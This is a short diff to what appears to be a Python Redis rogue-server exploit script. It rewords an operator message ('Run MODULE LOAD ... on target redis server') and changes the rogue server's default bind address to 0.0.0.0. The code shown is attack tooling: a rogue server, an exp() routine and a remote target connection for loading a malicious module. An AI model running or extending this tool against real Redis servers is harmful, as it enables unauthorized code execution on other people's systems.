@@ -117,7 +117,7 @@ def runserver(rhost, rport, passwd, lhost, lport, bind_addr, server_only):
         rogue = RogueServer(bind_addr, lport)
         print('Waiting for connection...')
         rogue.exp()
-        print('Payload sent.\nRun "MODULE LOAD /path/to/dbfile" on target redis to enable plugin.')
+        print('Payload sent.\nRun "MODULE LOAD /path/to/dbfile" on target redis server to enable the plugin.')
 
     # expolit
     remote = Remote(rhost, rport)
@@ -169,8 +169,8 @@ if __name__ == '__main__':
             help="rogue server ip")
     parser.add_option("--lport", dest="lp", type="int",
             help="rogue server listen port, default 21000", default=21000)
-    parser.add_option("--bind", dest="bind_addr", type="string", default="127.0.0.1",
-            help="rogue server bind ip, default 127.0.0.1")
+    parser.add_option("--bind", dest="bind_addr", type="string", default="0.0.0.0",
+            help="rogue server bind ip, default 0.0.0.0")
     parser.add_option("--server-only", dest="server_only", action="store_true", default=False,
             help="start rogue server only, no attack, default false")
 
